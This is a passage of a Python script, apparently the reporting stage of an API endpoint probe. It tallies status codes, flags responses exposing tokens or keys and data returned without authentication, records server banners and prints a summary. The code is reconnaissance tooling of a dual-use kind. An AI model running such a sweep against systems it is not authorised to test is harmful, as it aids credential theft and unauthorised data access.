    "token_key_findings": [],
    "unauth_data_leaks": [],
    "server_info": {},
}

# Count status codes
for r in results:
    sc = r.get("status_code", 0)
    if sc == 0:
        sc = "error"
    summary["status_code_distribution"][str(sc)] = summary["status_code_distribution"].get(str(sc), 0) + 1

# Collect useful data hits
for r, reason in all_useful:
    summary["hits_200_with_data"].append({
        "endpoint": r.get("endpoint", ""),
        "url": r.get("url", ""),
        "method": r.get("method", ""),
        "status_code": r.get("status_code", 0),
        "reason": reason,
        "body_keys": list(r.get("body_json", {}).keys())[:10] if r.get("body_json") and isinstance(r.get("body_json"), dict) else [],
        "body_preview": json.dumps(r.get("body_json"))[:300] if r.get("body_json") else r.get("body_text_preview", "")[:300],
    })

# Look for token/key findings specifically
for r, reason in all_useful:
    if "TOKEN" in reason or "KEY" in reason:
        summary["token_key_findings"].append({
            "endpoint": r.get("endpoint", ""),
            "url": r.get("url", ""),
            "reason": reason,
            "body_preview": json.dumps(r.get("body_json"))[:500] if r.get("body_json") else r.get("body_text_preview", "")[:500],
        })

# Check for unauth data leaks (200 without proper auth)
for r, reason in all_useful:
    label = r.get("label", "")
    category = r.get("category", "")
    custom_headers = r.get("custom_headers", {})
    if category in ("known_no_auth", "sweep") and not custom_headers:
        summary["unauth_data_leaks"].append({
            "endpoint": r.get("endpoint", ""),
            "url": r.get("url", ""),
            "reason": reason,
            "body_preview": json.dumps(r.get("body_json"))[:300] if r.get("body_json") else r.get("body_text_preview", "")[:300],
        })

# Extract server info
server_values = set()
powered_values = set()
for r in results:
    resp_hdrs = r.get("response_headers", {})
    if resp_hdrs.get("server"):
        server_values.add(resp_hdrs["server"])
    if resp_hdrs.get("x-powered-by"):
        powered_values.add(resp_hdrs["x-powered-by"])

summary["server_info"] = {
    "server": list(server_values),
    "x_powered_by": list(powered_values),
}

# Full output
output = {
    "summary": summary,
    "all_results": results,
}

with open(OUTPUT_FILE, "w") as f:
    json.dump(output, f, indent=2, default=str, ensure_ascii=False)

print(f"  Total requests made:     {total_tested}")
print(f"  HTTP 200 responses:      {len(all_200)}")
print(f"  Interesting responses:   {len(all_interesting)}")
print(f"  Useful data responses:   {len(all_useful)}")
print(f"  Token/key findings:      {len(summary['token_key_findings'])}")
print(f"  Unauth data leaks:       {len(summary['unauth_data_leaks'])}")
print(f"  Server:                  {list(server_values)}")
print(f"  X-Powered-By:            {list(powered_values)}")
print()
print(f"  Results saved to: {GREEN}{OUTPUT_FILE}{RESET}")

# ═══════════════════════════════════════════════════════════════
# PRINT SUMMARY
# ═══════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  FINAL SUMMARY{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}\n")

# Status code distribution
print(f"  {BOLD}Status Code Distribution:{RESET}")
for sc, count in sorted(summary["status_code_distribution"].items(), key=lambda x: int(x[0]) if x[0].isdigit() else 0):
    bar = "█" * min(count, 50)
    print(f"    {sc:>5}: {count:>5}  {DIM}{bar}{RESET}")

# Token/key findings
if summary["token_key_findings"]:
    print(f"\n  {RED_BG}{BOLD} TOKEN/KEY FINDINGS:{RESET}")
    for f in summary["token_key_findings"]:
        print(f"    {RED}●{RESET} {f['endpoint']}: {f['reason']}")
        print(f"      {DIM}{f['body_preview'][:200]}{RESET}")

# Unauth data leaks
if summary["unauth_data_leaks"]:
    print(f"\n  {RED_BG}{BOLD} UNAUTH DATA LEAKS (200 without auth):{RESET}")
    for f in summary["unauth_data_leaks"]:
        print(f"    {RED}●{RESET} {f['endpoint']}: {f['reason']}")
        print(f"      {DIM}{f['body_preview'][:200]}{RESET}")
else:
    print(f"\n  {GREEN}✓ No unauthenticated data leaks found{RESET}")

# Top useful hits
if all_useful:
    print(f"\n  {BOLD}TOP USEFUL DATA RESPONSES ({len(all_useful)} total):{RESET}")
    for r, reason in all_useful[:30]:
        ep = r.get("endpoint", "?")
        method = r.get("method", "GET")
        label = r.get("label", "")
        body_json = r.get("body_json")
        snippet = ""
        if body_json and isinstance(body_json, dict):
            snippet = json.dumps(body_json)[:120]
        print(f"    {GREEN}●{RESET} {method:<5} /{ep:<40} [{label}]  {reason}")
        if snippet:
            print(f"        {DIM}{snippet}{RESET}")

# Non-404 unique endpoints discovered
discovered_endpoints = set()
for r in results:
    if r.get("status_code", 0) not in (0, 404):
        discovered_endpoints.add(r.get("endpoint", ""))

print(f"\n  {BOLD}Discovered non-404 endpoints ({len(discovered_endpoints)}):{RESET}")
for ep in sorted(discovered_endpoints):
    print(f"    {CYAN}•{RESET} /{ep}")

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PROBE COMPLETE{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}\n")
